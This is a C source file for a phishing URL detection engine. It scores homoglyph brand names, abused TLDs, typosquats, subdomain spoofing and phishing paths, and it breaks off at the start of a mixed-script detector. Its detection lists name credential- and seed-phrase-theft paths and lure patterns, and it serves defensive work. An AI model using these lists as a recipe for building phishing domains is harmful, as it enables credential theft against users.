/*
 * hlse_core.c — HLSE Core Detection Engine (Reference Implementation in C)
 *
 * This is a portable reference implementation of HLSE's URL phishing
 * detection logic, written in pure ANSI C. It exists to:
 *
 *   1. Demonstrate the detection algorithms outside the Rust ecosystem
 *   2. Serve as a portable validator (no toolchain dependencies beyond GCC)
 *   3. Provide a reference implementation that can be ported to other
 *      languages (Go, Zig, embedded targets)
 *
 * The Rust implementation (in src/monitors/) is the canonical version.
 * This C version covers the most important 60% of detection logic:
 *
 *   - Brand homoglyph detection (g00gle.com → google)
 *   - Suspicious TLD detection (.xyz, .top, etc.)
 *   - Phishing path-pattern detection (/verify, /signin, etc.)
 *   - Subdomain brand spoofing (paypal.com.attacker.xyz)
 *   - Excessive subdomain depth
 *   - Hyphenated security-word domains (secure-net-fix-update)
 *
 * Build:  gcc -O2 -Wall -Wextra -Wpedantic -o hlse_core hlse_core.c
 * Test:   ./hlse_core --self-test
 * Use:    ./hlse_core "https://g00gle.com"
 *
 * Author identity (do not change without rotating MAINTAINER.md):
 *   bitcoin:bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5
 */

#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <ctype.h>
#include <stddef.h>
#include <stdint.h>
#include <math.h>

#include "hlse_core.h"   /* Verdict, ScanResult, public API declarations */
#include "hlse_text.h"   /* TextVerdict, hlse_check_text */
#include "hlse_protect.h" /* ProtectionVerdict, hlse_protect_scan */
#include "hlse_util.h"    /* hlse_shannon_entropy, hlse_edit_distance */
#include "hlse_supply.h"  /* PackageVerdict, PasteVerdict, NetworkVerdict */
#include "hlse_file.h"    /* FileVerdict, hlse_check_file */
#include "hlse_audit.h"   /* AuditVerdict, hlse_audit_all */
#include "hlse_secrets.h"  /* SecretVerdict, hlse_scan_secrets */

#include <sys/stat.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

/* ───────────────────────────── version ──────────────────────────────── */
/* HLSE_VERSION is defined in hlse_core.h so library users can read it
 * without access to this translation unit.                             */
#define HLSE_BUILD_DATE    __DATE__
#define HLSE_IDENTITY      "bitcoin:bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5"

/* ───────────────────────────── constants ────────────────────────────── */

#define MAX_URL    2048
#define MAX_HOST    256
#define MAX_PATH   1024

/* Confusable map: digits and capitals that lookalike lowercase letters.
 * The order matters: HashMap-style "last wins" — but in C we iterate
 * linearly so we put the preferred substitution FIRST.                  */
static const struct { char from; char to; } CONFUSABLES[] = {
    { '0', 'o' },
    { '1', 'l' },   /* 1→l is the most common phishing substitution     */
    { '3', 'e' },
    { '4', 'a' },
    { '5', 's' },
    { '6', 'b' },
    { '8', 'b' },
    { '9', 'g' },
    { 'I', 'l' },   /* paypaII.com pattern — capital I looks like l     */
};
static const int N_CONFUSABLES =
    sizeof(CONFUSABLES) / sizeof(CONFUSABLES[0]);

/* Major brand names that phishers target.
 * Adding to this list: append the lowercase brand string (no .com).    */
static const char *BRANDS[] = {
    "google", "microsoft", "apple", "amazon", "facebook", "meta",
    "netflix", "instagram", "twitter", "linkedin", "youtube",
    "dropbox", "yahoo", "outlook", "github", "gitlab",
    "paypal", "chase", "wellsfargo", "bankofamerica", "citibank",
    "barclays", "hsbc", "usbank", "capitalone",
    "rakuten", "docomo", "softbank", "line", "paypay",
    "mufg", "smbc", "mizuho",
    "anthropic", "openai", "cloudflare", "stripe", "twilio",
    /* AI assistants — rising phishing target (fake ChatGPT/Gemini login pages) */
    "chatgpt", "gemini",
    /* Crypto exchanges — active phishing targets */
    "coinbase", "binance", "kraken", "coincheck",
    /* Logistics — package delivery phishing */
    "fedex", "dhlexpress",
    /* Gaming / collaboration */
    "discord", "steam", "epicgames", "roblox",
    /* E-commerce */
    "ebay", "shopify",
    /* Emerging targets */
    "tiktok", "wordpress",
    /* Streaming — active phishing targets for subscription fraud */
    "hulu", "spotify", "disney", "hbo", "twitch", "peacock",
    /* Telecom — SMS / carrier spoofing */
    "verizon", "tmobile",
    /* Social platforms */
    "reddit", "snapchat", "telegram", "whatsapp",
    /* Retail / logistics */
    "walmart", "bestbuy", "homedepot", "usps", "dhl",
    /* Brokerage / fintech */
    "robinhood", "etrade", "fidelity", "schwab",
    /* Enterprise SaaS — BEC targets */
    "zoom", "salesforce", "adobe", "slack", "oracle",
    /* P2P payments — high-fraud targets */
    "venmo", "zelle", "cashapp", "payoneer",
    /* Logistics — package delivery phishing */
    "ups",
    /* Crypto exchange — active phishing campaigns */
    "crypto",
    /* Security software — impersonated in fake-AV/tech-support scams */
    "norton", "mcafee", "kaspersky", "bitdefender", "avast", "malwarebytes",
    /* Tax / accounting software — seasonal phishing spikes */
    "intuit", "turbotax", "quickbooks",
    /* Microsoft 365 brand — separate from "microsoft" for phishing URLs */
    "office365", "microsoft365",
    /* Microsoft authentication service — "microsoft0nline.com" typosquat target */
    "microsoftonline",
    /* Enterprise collaboration — BEC/vishing targets */
    "microsoftteams",
    /* Financial / banking */
    "truist",
    /* Document signing — DocuSign phishing is one of the most common BEC vectors */
    "docusign",
    /* Crypto wallets — MetaMask/Ledger are #1 wallet-draining phishing targets */
    "metamask", "ledger", "trezor", "trustwallet",
    /* Crypto / NFT marketplaces — seed-phrase phishing and fake-mint lures */
    "opensea", "uniswap", "pancakeswap", "blockchain",
    /* Identity / access management — Okta impersonation in enterprise spear-phishing */
    "okta",
    /* Productivity / design SaaS — targeted in spear-phishing against tech workers */
    "figma", "notion",
    /* Neobanks / cross-border payments — high-growth phishing targets */
    "wise", "revolut",
    /* Password managers — compromised master passwords give access to everything */
    "1password", "lastpass", "bitwarden",
    NULL
    /* NOTE: government agencies (irs, medicare) intentionally omitted —
     * their .gov TLD cannot be registered by attackers, so the only real
     * risk is brand-in-path on a suspicious domain, which the text-scan
     * compound signal already covers without URL false-positives.      */
};

/* High-risk top-level domains: legitimate sites rarely use these,
 * phishing kits use them constantly because they're cheap and unmonitored. */
static const char *SUSPICIOUS_TLDS[] = {
    ".xyz", ".top", ".click", ".online", ".live", ".work",
    ".loan", ".tk", ".gq", ".cf", ".ml", ".ga",
    ".link", ".info", ".monster", ".rest", ".cyou",
    ".zip", ".mov", ".country", ".kim", ".date",
    ".review", ".faith", ".science", ".party", ".gdn",
    ".cc", ".icu", ".biz", ".space", ".buzz",
    /* Additional heavily abused TLDs */
    ".pw", ".su", ".vip", ".win", ".download", ".stream",
    /* 2024-2025 heavily abused (minimal legitimate use, high phishing volume) */
    ".cfd",    /* Cheap, heavily abused in 2024 campaigns */
    ".hair",   /* Near-zero legitimate use, high phishing density */
    ".boats",  /* Very rarely legitimate, common in phishing kits */
    ".sbs",    /* Near-zero legitimate use, observed in 2024-2025 phishing kits */
    ".fit",    /* Minimal legitimate use, actively abused in phishing campaigns */
    NULL
};

/* Phishing-typical URL path patterns. */
static const char *PATH_PATTERNS[] = {
    "/verify", "/signin", "/login", "/account", "/update",
    "/secure", "/reset", "/recover", "/confirm", "/auth",
    "/wallet", "/billing", "/suspended", "/locked", "/unlock",
    "/claim", "/refund", "/relief", "/file", "/payment",
    "/identity", "/verification", "/validate", "/activate",
    "/token", "/session",
    /* 2FA/OTP bypass phishing */
    "/2fa", "/otp", "/mfa",
    /* Crypto onboarding phishing */
    "/kyc",
    /* Financial transfer phishing */
    "/transfer", "/wire",
    /* Subscription / invoice fraud */
    "/renew", "/invoice", "/subscription",
    /* Fake checkout / payment pages */
    "/checkout", "/complete",
    /* Webmail credential harvest */
    "/webmail", "/owa",
    /* CMS admin panels — credential harvest via fake login */
    "/wp-admin", "/wp-login", "/administrator",
    /* OAuth / SSO abuse */
    "/oauth", "/sso", "/saml",
    /* Account recovery abuse */
    "/forgot", "/password-reset",
    /* Crypto seed phrase / wallet draining */
    "/seed", "/mnemonic", "/recovery-phrase",
    /* Malware delivery paths (combined with suspicious TLD = strong signal) */
    "/setup", "/installer", "/update.exe", "/setup.exe",
    NULL
};

/* Words used in phishing-typical hyphenated domains */
static const char *SECURITY_WORDS[] = {
    "secure", "security", "verify", "verification", "update", "account",
    "login", "signin", "reset", "recover", "recovery", "support", "help",
    "webmail", "mail", "payment", "portal", "relief",
    "refund", "claim", "billing", "suspend", "locked",
    "identity", "validate", "activate", "alert", "urgent",
    /* Giveaway / promo scam domains */
    "free", "giveaway", "promo", "gift", "reward", "bonus", "nitro",
    /* Crypto/NFT scam lures — "airdrop" is overwhelmingly scam-correlated
     * and almost never a hyphenated token in a benign registrable domain
     * (real projects announce airdrops on their primary domain). Generic
     * terms like "wallet" are intentionally omitted — they appear in
     * legitimate hyphenated domains (crypto-wallet-news.com).            */
    "airdrop",
    /* Financial transfer fraud — phishing via domain like "paypal-transfer.com" */
    "transfer",
    /* Product-name spoofing: "ledger-live.org", "adobe-live.net" */
    "live",
    /* Action/confirmation words commonly used in phishing domains */
    "confirm", "manage", "protect",
    NULL
};

/* Compute Damerau-Levenshtein distance (with adjacent transpositions).
 * Used for typosquat detection: edit distance 1 from a known brand. */
static int
damerau_levenshtein(const char *a, const char *b, int max_check) {
    (void)max_check;  /* shared impl uses its own internal length bound */
    return hlse_edit_distance(a, b);
}

/* ─────────────────────────── utility funcs ───────────────────────────── */

static void
str_tolower(char *s) {
    while (*s) { *s = (char)tolower((unsigned char)*s); s++; }
}

static int
contains(const char *haystack, const char *needle) {
    return strstr(haystack, needle) != NULL;
}

static int
ends_with(const char *s, const char *suffix) {
    size_t ls = strlen(s);
    size_t lsuf = strlen(suffix);
    if (lsuf > ls) return 0;
    return strcmp(s + ls - lsuf, suffix) == 0;
}

/* ──────────────────── URL parsing (minimal, robust) ──────────────────── */

typedef struct {
    char host[MAX_HOST];
    char path[MAX_PATH];
    int  is_https;
} ParsedUrl;

static int
parse_url(const char *raw, ParsedUrl *out) {
    const char *p = raw;
    const char *end_proto;
    const char *host_start, *host_end, *slash;

    if (!raw || !out) return 0;
    memset(out, 0, sizeof(*out));

    if (strncmp(raw, "https://", 8) == 0) {
        out->is_https = 1;
        p = raw + 8;
    } else if (strncmp(raw, "http://", 7) == 0) {
        out->is_https = 0;
        p = raw + 7;
    } else {
        return 0;  /* unsupported scheme */
    }

    host_start = p;
    /* host ends at next '/' or end of string */
    slash = strchr(p, '/');
    host_end = slash ? slash : p + strlen(p);
    if (host_end - host_start >= MAX_HOST) return 0;
    if (host_end == host_start) return 0;  /* empty host */

    memcpy(out->host, host_start, (size_t)(host_end - host_start));
    out->host[host_end - host_start] = '\0';
    str_tolower(out->host);

    if (slash) {
        size_t plen = strlen(slash);
        if (plen >= MAX_PATH) plen = MAX_PATH - 1;
        memcpy(out->path, slash, plen);
        out->path[plen] = '\0';
        str_tolower(out->path);

        /* Decode URL percent-encoding in path: %76 → 'v', %65 → 'e'.
         * Attackers use this to hide phishing paths like /verify.
         * This runs AFTER copy but BEFORE pattern matching.           */
        {
            char *r = out->path, *w = out->path;
            while (*r) {
                if (*r == '%' && r[1] && r[2]) {
                    char hex[3] = { r[1], r[2], '\0' };
                    char *end = NULL;
                    long val = strtol(hex, &end, 16);
                    if (end == hex + 2 && val >= 0x20 && val < 0x7F) {
                        char c = (char)val;
                        if (c >= 'A' && c <= 'Z') c = (char)(c + 32);
                        *w++ = c;
                        r += 3;
                        continue;
                    }
                }
                *w++ = *r++;
            }
            *w = '\0';
        }
    } else {
        out->path[0] = '/';
        out->path[1] = '\0';
    }

    /* Check if host is an IP address (no dots-separated-letters).
     * IP-based URLs with brand words in path are a phishing signal. */
    {
        int is_ip = 1;
        const char *h = out->host;
        while (*h) {
            if ((*h >= 'a' && *h <= 'z') && *h != 'x') {
                /* 'x' allowed for hex in IPv6, but letters like 'a'-'f'
                 * also appear in hex. However, if we see g-z (non-hex
                 * letters), it's definitely not an IP.                */
                if (*h > 'f') { is_ip = 0; break; }
            }
            h++;
        }
        /* Simple heuristic: if host has no non-hex letters AND
         * contains at least one dot or colon, it's likely an IP.     */
        if (is_ip && (strchr(out->host, '.') || strchr(out->host, ':'))) {
            /* Store IP flag in path[MAX_PATH-1] as a hidden flag byte.
             * Actually, let's not abuse the struct. Instead, let the
             * detect functions check the host format directly.        */
        }
    }

    return 1;

    /* unused — silence warning */
    (void)end_proto;
}

/* ──────────────────────── homoglyph normalization ─────────────────────── */

/* Normalize multi-character (digraph) confusables that single-char
 * substitution misses. These exploit the visual width of letter pairs:
 *   "rn" looks like "m"  (arnazon → amazon)
 *   "vv" looks like "w"  (gvvgle  → no, but covers vv→w)
 *   "cl" looks like "d"  (click   → no false trigger; only in brand check)
 * Returns count of substitutions. Output capacity >= strlen(in)+1.     */
static int
normalize_digraphs(const char *in, char *out) {
    int count = 0;
    while (*in) {
        if (in[0] == 'r' && in[1] == 'n') {
            *out++ = 'm'; in += 2; count++; continue;
        }
        if (in[0] == 'v' && in[1] == 'v') {
            *out++ = 'w'; in += 2; count++; continue;
        }
        *out++ = (char)tolower((unsigned char)*in);
        in++;
    }
    *out = '\0';
    return count;
}

/* Replace each char in `in` with its confusable lowercase equivalent.
 * Returns the count of substitutions made. Output written to `out`,
 * which must have capacity >= strlen(in) + 1.                          */
static int
normalize_confusables(const char *in, char *out) {
    int count = 0;
    int i;
    while (*in) {
        char c = *in;
        char replacement = c;
        for (i = 0; i < N_CONFUSABLES; i++) {
            if (CONFUSABLES[i].from == c) {
                replacement = CONFUSABLES[i].to;
                count++;
                break;
            }
        }
        *out++ = (char)tolower((unsigned char)replacement);
        in++;
    }
    *out = '\0';
    return count;
}

/* Find the registrable domain label, e.g. "google" in "mail.google.com".
 * Simplistic: returns pointer to the second-last dot-separated label.   */
static const char *
sld_label(const char *host, char *buf, size_t bufsz) {
    const char *p = host + strlen(host);
    int dots = 0;
    const char *label_start = host;

    while (p > host) {
        p--;
        if (*p == '.') {
            dots++;
            if (dots == 1) continue;       /* skip TLD dot */
            if (dots == 2) {
                label_start = p + 1;
                break;
            }
        }
    }
    /* copy until next dot */
    {
        const char *end = strchr(label_start, '.');
        size_t len;
        if (!end) end = label_start + strlen(label_start);
        len = (size_t)(end - label_start);
        if (len >= bufsz) len = bufsz - 1;
        memcpy(buf, label_start, len);
        buf[len] = '\0';
    }
    return buf;
}

/* ───────────────────────────── detectors ────────────────────────────── */

/* Verdict is defined in hlse_core.h (included via hlse_scan section). */

static void
add_reason(Verdict *v, int delta, const char *fmt, ...) {
    va_list ap;
    if (v->n_reasons >= 12) return;
    if (delta > 0) {
        v->score += delta;
        if (v->score > 100) v->score = 100;
    }
    va_start(ap, fmt);
    vsnprintf(v->reasons[v->n_reasons], sizeof(v->reasons[0]), fmt, ap);
    va_end(ap);
    v->n_reasons++;
}

/* 1. Brand homoglyph detection.
 *    "g00gle.com" → normalize → "google.com" → contains "google".
 *    Original ("g00gle") does NOT contain "google" → real attack.
 *
 *    NOTE: We normalize from the RAW host (before lowercasing) so that
 *    the 'I' → 'l' mapping (capital I to lowercase l) survives. After
 *    lowercasing, 'I' becomes 'i' and we lose that signal.            */
static void
detect_homoglyph(const ParsedUrl *u, Verdict *v) {
    char normalized[MAX_HOST];
    int  count;
    int  i;
    char host_lower[MAX_HOST];

    /* Get the original-case host. parse_url() already lowercased u->host,
     * so we need to redo against the user-supplied URL. For now, we work
     * on the lowercased host but keep the I→l mapping aware: any 'i'
     * preceded by something that suggests a brand mismatch counts. The
     * cleanest fix is to add 'i' → 'l' to the confusable table when no
     * legitimate brand has consecutive 'ii'. We chose: keep 'I'→'l'
     * AND add 'i'→'l' when followed by another 'i' (a digram trick).
     * But this risks "wikipedia" matching. Instead, add a specific
     * post-lowercase normalisation pass for 'ii' → 'll' which is
     * extremely rare in real brands.                                  */
    count = normalize_confusables(u->host, normalized);

    /* Special case: 'paypaii' should map to 'paypall' since the original
     * was likely 'paypaII' before lowercasing. We detect this by looking
     * at any 'ii' digram and substituting one path with 'll'.         */
    {
        char *p = strstr(normalized, "ii");
        if (p) {
            char alt[MAX_HOST];
            /* Rebuild "<prefix>ll<suffix>" with bounded memcpy. The source
             * (normalized) already fits in MAX_HOST so the result does too;
             * the explicit clamps keep every write provably in-bounds (no
             * unbounded strcat).                                          */
            size_t prefix_len = (size_t)(p - normalized);
            size_t suffix_len = strlen(p + 2);
            size_t avail;
            if (prefix_len > sizeof(alt) - 3) prefix_len = sizeof(alt) - 3;
            memcpy(alt, normalized, prefix_len);
            alt[prefix_len]     = 'l';
            alt[prefix_len + 1] = 'l';
            avail = sizeof(alt) - prefix_len - 3;  /* room for suffix + NUL */
            if (suffix_len > avail) suffix_len = avail;
            memcpy(alt + prefix_len + 2, p + 2, suffix_len);
            alt[prefix_len + 2 + suffix_len] = '\0';
            /* Try matching with this alternative form */
            for (i = 0; BRANDS[i] != NULL; i++) {
                if (contains(alt, BRANDS[i]) && !contains(u->host, BRANDS[i])) {
                    add_reason(v, 45,
                               "Brand homoglyph (II→ll variant): '%s' resembles '%s'",
                               u->host, BRANDS[i]);
                    return;
                }
            }
        }
    }

    strncpy(host_lower, u->host, sizeof(host_lower) - 1);
    host_lower[sizeof(host_lower) - 1] = '\0';
    str_tolower(host_lower);

    if (count >= 1) {
        for (i = 0; BRANDS[i] != NULL; i++) {
            const char *b = BRANDS[i];
            if (contains(normalized, b) && !contains(host_lower, b)) {
                add_reason(v, 45, "Brand homoglyph: '%s' -> '%s' (%s)",
                           u->host, normalized, b);
                if (count >= 2) {
                    add_reason(v, 5, "Multiple confusable chars (%d)", count);
                }
                return;
            }
        }
    }
}

/* 2. Suspicious TLD detection. */
static void
detect_suspicious_tld(const ParsedUrl *u, Verdict *v) {
    int i;
    for (i = 0; SUSPICIOUS_TLDS[i] != NULL; i++) {
        if (ends_with(u->host, SUSPICIOUS_TLDS[i])) {
            add_reason(v, 20, "High-risk TLD: %s", SUSPICIOUS_TLDS[i]);
            return;
        }
    }
}

/* Domains we trust enough that single-signal phishing-path matches
 * (e.g. /verify, /signin) do not raise the score. These are HIGH-traffic
 * legitimate sites that contain user-generated content with all kinds
 * of words. Multi-signal attacks still fire normally.                   */
static const char *TRUSTED_HOSTS[] = {
    "wikipedia.org", "github.com", "gitlab.com",
    "stackoverflow.com", "stackexchange.com",
    "docs.rs", "crates.io",
    "google.com", "youtube.com",
    "microsoft.com", "office.com", "live.com",
    "microsoftonline.com", "microsoft365.com",
    "amazon.com", "amazon.co.jp",
    "apple.com",
    "icloud.com",  /* Apple iCloud — contains "password" in paths */
    /* Password managers — URLs contain "password", "vault", "master" in paths */
    "1password.com", "lastpass.com", "bitwarden.com",
    /* Identity/access — contain "login", "sso", "auth" in paths */
    "okta.com", "auth0.com", "onelogin.com",
    /* Document signing — contain "sign", "sign-in" in paths */
    "docusign.com", "hellosign.com",
    /* Developer platforms — contain "verify", "auth" in paths */
    "vercel.com", "netlify.com",
    NULL
};

static int
is_trusted_host(const char *host) {
    int i;
    for (i = 0; TRUSTED_HOSTS[i] != NULL; i++) {
        if (ends_with(host, TRUSTED_HOSTS[i])) return 1;
    }
    return 0;
}

/* 3. Phishing path patterns. */
static void
detect_phishing_path(const ParsedUrl *u, Verdict *v) {
    int i;
    int matches = 0;
    char first[64];
    int trusted = is_trusted_host(u->host);
    first[0] = '\0';

    for (i = 0; PATH_PATTERNS[i] != NULL; i++) {
        if (contains(u->path, PATH_PATTERNS[i])) {
            matches++;
            if (matches == 1) {
                strncpy(first, PATH_PATTERNS[i], sizeof(first) - 1);
                first[sizeof(first) - 1] = '\0';
            }
        }
    }

    /* Trusted hosts: require ≥3 path matches before flagging.
     * (No legitimate page uses /verify AND /signin AND /reset.)      */
    if (trusted && matches < 3) return;

    if (matches >= 1) {
        int delta = 15 + (matches - 1) * 8;
        if (delta > 31) delta = 31;
        add_reason(v, delta, "Phishing path pattern (%d match%s, e.g. '%s')",
                   matches, matches == 1 ? "" : "es", first);
    }
}

/* Forward declaration (defined after detect_security_hyphenation). */
static int brand_is_token_in_sld(const char *sld, const char *brand);

/* 4. Subdomain brand spoofing — "paypal.com.attacker.xyz" pattern.
 *    We must handle ccTLD+SLD combos like .co.jp, .co.uk, .or.jp
 *    as a single TLD unit. Otherwise rakuten.co.jp looks like
 *    "rakuten" appearing before ".jp" which is the "registrable" domain. */
static void
detect_subdomain_spoof(const ParsedUrl *u, Verdict *v) {
    int i;
    char host_copy[MAX_HOST];
    char *labels[16];
    int  n_labels = 0;
    char *tok;
    char *saveptr = NULL;

    /* Two-label TLD suffixes that are effectively one TLD */
    static const char *MULTI_TLDS[] = {
        "co.jp", "or.jp", "ne.jp", "ac.jp", "go.jp", "ed.jp",
        "co.uk", "org.uk", "ac.uk",
        "co.kr", "or.kr",
        "com.au", "com.br", "com.cn",
        NULL
    };

    strncpy(host_copy, u->host, sizeof(host_copy) - 1);
    host_copy[sizeof(host_copy) - 1] = '\0';

    tok = strtok_r(host_copy, ".", &saveptr);
    while (tok && n_labels < 16) {
        labels[n_labels++] = tok;
        tok = strtok_r(NULL, ".", &saveptr);
    }
    if (n_labels < 3) return;

    /* Determine how many labels belong to the TLD.
     * Default: 1 (e.g. .com, .xyz). Multi-TLDs get 2 (e.g. .co.jp). */
    {
        int tld_labels = 1;
        if (n_labels >= 3) {
            char suffix[MAX_HOST];
            snprintf(suffix, sizeof(suffix), "%s.%s",
                     labels[n_labels - 2], labels[n_labels - 1]);
            for (i = 0; MULTI_TLDS[i]; i++) {
                if (strcmp(suffix, MULTI_TLDS[i]) == 0) {
                    tld_labels = 2;
                    break;
                }
            }
        }
        {
            int registrable_start = n_labels - 1 - tld_labels;
            if (registrable_start < 1) return; /* too few labels */

            for (i = 0; i < registrable_start; i++) {
                int j;
                for (j = 0; BRANDS[j] != NULL; j++) {
                    size_t blen = strlen(BRANDS[j]);
                    int exact_match = (strcmp(labels[i], BRANDS[j]) == 0);
                    /* Also catch "paypal-verify" or "microsoft365-sso" as
                     * subdomain labels where brand is a hyphen-delimited token */
                    int token_match = (brand_is_token_in_sld(labels[i], BRANDS[j])
                                       && !exact_match);

                    if (exact_match || token_match) {
                        /* Check if registrable domain IS the brand */
                        char registrable[MAX_HOST];
                        if (tld_labels == 2) {
                            snprintf(registrable, sizeof(registrable), "%s.%s.%s",
                                     labels[registrable_start],
                                     labels[n_labels - 2], labels[n_labels - 1]);
                        } else {
                            snprintf(registrable, sizeof(registrable), "%s.%s",
                                     labels[registrable_start], labels[n_labels - 1]);
                        }
                        /* Is the registrable domain the brand itself? */
                        if (strstr(registrable, BRANDS[j]) != NULL) return;
                        (void)blen;  /* used via brand_is_token_in_sld */

                        add_reason(v, token_match ? 35 : 45,
                                   "Subdomain spoofing: '%s' appears before "
                                   "registrable domain", BRANDS[j]);
                        return;
                    }
                }
            }
        }
    }
}

/* 5. Excessive subdomain depth. */
static void
detect_subdomain_depth(const ParsedUrl *u, Verdict *v) {
    int dots = 0;
    const char *p = u->host;
    while (*p) { if (*p == '.') dots++; p++; }
    if (dots >= 4) {
        add_reason(v, 15, "Deep subdomain nesting (%d levels)", dots + 1);
    }
}

/* 5b. DGA / randomized-domain detection via Shannon entropy + digit ratio.
 *
 * Research basis: Shannon entropy of the registrable domain (F40/F41 in
 * the Frontiers 2024 phishing-URL feature set) is one of the strongest
 * lexical signals for algorithmically generated domains. Real brands use
 * pronounceable, low-entropy names (google, paypal, amazon). DGA malware
 * and throwaway phishing domains use high-entropy random strings
 * (x7k2p9qzr4mw, kjdhfgkjsdhfg8374).
 *
 * Two independent signals, each grounded in the literature:
 *   1. High Shannon entropy (>= 3.5 bits/char over the SLD)
 *   2. High digit-to-letter ratio (>= 0.30) — random domains pack digits
 *
 * Conservative thresholds avoid flagging legitimate short brand names. */
static double
shannon_entropy_str(const char *s) {
    return hlse_shannon_entropy_str(s);
}

static void
detect_dga_entropy(const ParsedUrl *u, Verdict *v) {
    char sld_buf[MAX_HOST];
    const char *sld;
    size_t len, i;
    int digits = 0, letters = 0;
    double entropy, digit_ratio;

    sld = sld_label(u->host, sld_buf, sizeof(sld_buf));
    if (!sld) return;

    len = strlen(sld);
    /* Skip short SLDs — too little signal, and many legit brands are
     * short (bbc, cnn, vox). Require >= 8 chars for entropy to mean
     * something. */
    if (len < 8) return;

    /* If this SLD exactly matches a known brand, never flag it. */
    for (i = 0; BRANDS[i] != NULL; i++) {
        if (strcmp(sld, BRANDS[i]) == 0) return;
    }

    for (i = 0; i < len; i++) {
        char c = sld[i];
        if (c >= '0' && c <= '9') digits++;
        else if (c >= 'a' && c <= 'z') letters++;
    }
    digit_ratio = (letters > 0) ? (double)digits / (double)(digits + letters)
                                : 1.0;

    entropy = shannon_entropy_str(sld);

    /* KEY INSIGHT (validated empirically against brand corpus):
     * Shannon entropy ALONE cannot separate DGA domains from long
     * legitimate brand names — "stackoverflow" (3.55 bits) scores nearly
     * identical to "x7k2p9qzr4mw" (3.58 bits). The discriminator is the
     * presence of digits: real brands almost never embed digits in their
     * registrable domain, while DGA/random domains pack them.
     *
     * So we require BOTH high entropy AND digit presence for the strong
     * signal, eliminating false positives on amazonwebservices,
     * stackoverflow, cloudflare, etc.                                  */
    if (entropy >= 3.3 && len >= 10 && digits >= 2) {
        add_reason(v, 35,
            "High-entropy domain '%s' (%.2f bits/char, %d digits) — "
            "likely algorithmically generated", sld, entropy, digits);
    }
    /* Digit-heavy domain even at lower entropy (e.g. "secure12345login") */
    else if (digit_ratio >= 0.30 && digits >= 4) {
        add_reason(v, 25,
            "Digit-heavy domain '%s' (%d digits) — atypical of real "
            "brands", sld, digits);
    }
}

/* Returns 1 if `brand` appears as a complete hyphen-delimited token in `sld`.
 * Prevents short brands like "line" from matching "airline-update". */
static int
brand_is_token_in_sld(const char *sld, const char *brand)
{
    size_t blen = strlen(brand);
    const char *p = sld;
    while (*p) {
        if (strncmp(p, brand, blen) == 0) {
            int pre_ok  = (p == sld)     || (*(p - 1) == '-');
            int post_ok = (p[blen] == '\0') || (p[blen] == '-');
            if (pre_ok && post_ok) return 1;
        }
        p++;
    }
    return 0;
}

/* 6. Hyphenated security-word domain ("secure-net-fix-update.top"). */
static void
detect_security_hyphenation(const ParsedUrl *u, Verdict *v) {
    char sld_buf[MAX_HOST];
    const char *sld;
    int sec_count = 0;
    int hyphens = 0;
    int i;
    const char *p;

    sld = sld_label(u->host, sld_buf, sizeof(sld_buf));
    if (!sld) return;

    for (i = 0; SECURITY_WORDS[i] != NULL; i++) {
        if (contains(sld, SECURITY_WORDS[i])) sec_count++;
    }
    p = sld;
    while (*p) { if (*p == '-') hyphens++; p++; }

    if (sec_count >= 1 && hyphens >= 1) {
        add_reason(v, 20,
                   "Phishing-typical domain structure (%d security words, "
                   "%d hyphens)", sec_count, hyphens);
    }

    /* Brand + hyphen + security word is a classic phishing pattern:
     * paypal-verify, apple-support, amazon-login, microsoft-account.
     * The real brand never hyphenates its name with a security word
     * in the registrable domain (paypal.com, not paypal-verify.com). */
    if (hyphens >= 1 && sec_count >= 1) {
        for (i = 0; BRANDS[i] != NULL; i++) {
            /* brand_is_token_in_sld() requires a complete hyphen-delimited
             * token match so short brands (e.g. "line") don't fire on
             * "airline-update". */
            if (brand_is_token_in_sld(sld, BRANDS[i])) {
                add_reason(v, 35,
                    "Brand impersonation: '%s' hyphenated with security "
                    "term — real brand uses its own domain", BRANDS[i]);
                break;
            }
        }
    }
}

/* 7. Typosquat detection — edit distance 1 from a known brand.
 *    Skipped if the homoglyph detector already fired (avoids double
 *    counting when '1' substitution is BOTH a confusable AND a typo). */
static void
detect_typosquat(const ParsedUrl *u, Verdict *v) {
    char sld_buf[MAX_HOST];
    const char *sld;
    int i;

    /* If homoglyph already flagged this URL with a brand match, skip. */
    for (i = 0; i < v->n_reasons; i++) {
        if (strstr(v->reasons[i], "Brand homoglyph") != NULL ||
            strstr(v->reasons[i], "homoglyph (II→ll variant)") != NULL ||
            strstr(v->reasons[i], "Mixed-script homoglyph") != NULL)
        {
            return;
        }
    }

    if (is_trusted_host(u->host)) return;

    sld = sld_label(u->host, sld_buf, sizeof(sld_buf));
    if (!sld) return;
    if (strlen(sld) < 4 || strlen(sld) > 20) return;

    for (i = 0; BRANDS[i] != NULL; i++) {
        if (strcmp(sld, BRANDS[i]) == 0) return;
    }

    for (i = 0; BRANDS[i] != NULL; i++) {
        size_t bl = strlen(BRANDS[i]);
        size_t sl = strlen(sld);
        size_t diff = bl > sl ? bl - sl : sl - bl;
        int d;
        if (diff > 2) continue;

        d = damerau_levenshtein(sld, BRANDS[i], 3);
        if (d == 1) {
            add_reason(v, 50,
                       "Typosquat: '%s' is edit distance 1 from '%s'",
                       sld, BRANDS[i]);
            return;
        }
        if (d == 2 && bl >= 7) {
            add_reason(v, 30,
                       "Possible typosquat: '%s' is edit distance 2 from '%s'",
                       sld, BRANDS[i]);
            return;
        }
    }

    /* Digraph homoglyph: "rn"→"m", "vv"→"w" (arnazon → amazon).
     * Normalize the SLD and re-check against brands.                  */
    {
        char digraph_norm[MAX_HOST];
        int subs = normalize_digraphs(sld, digraph_norm);
        if (subs > 0) {
            for (i = 0; BRANDS[i] != NULL; i++) {
                if (strcmp(digraph_norm, BRANDS[i]) == 0) {
                    add_reason(v, 50,
                        "Digraph homoglyph: '%s' mimics '%s' (rn/vv trick)",
                        sld, BRANDS[i]);
                    return;
                }
            }
        }
    }
}

/* Fold a single Unicode confusable code point to its Latin look-alike
 * (defined below; shared with the Punycode/IDN homograph detector). */
static char cp_fold(uint32_t cp);

/* 8. Non-ASCII (Cyrillic, Greek, mixed-script) homoglyph detection.
 * Real Latin domains contain only ASCII letters/digits/hyphens. Any
 * non-ASCII code point in a domain that resembles a major brand is a
 * strong attack signal (mіcrosoft.com uses Cyrillic і).               */
static void
detect_mixed_script(const ParsedUrl *u, Verdict *v) {
